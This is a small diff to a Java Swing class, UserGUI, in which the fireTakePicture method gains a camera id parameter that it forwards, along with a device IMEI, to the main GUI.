@@ -189,8 +189,8 @@ public class UserGUI extends JFrame implements WindowListener {
 		if(picturePanel != null) picturePanel.updateImage(picture);
 	}
 	
-	public void fireTakePicture() {
-		gui.fireTakePicture(imei);
+	public void fireTakePicture(int camid) {
+		gui.fireTakePicture(imei, Long.valueOf(camid));
 	}
 	
 	
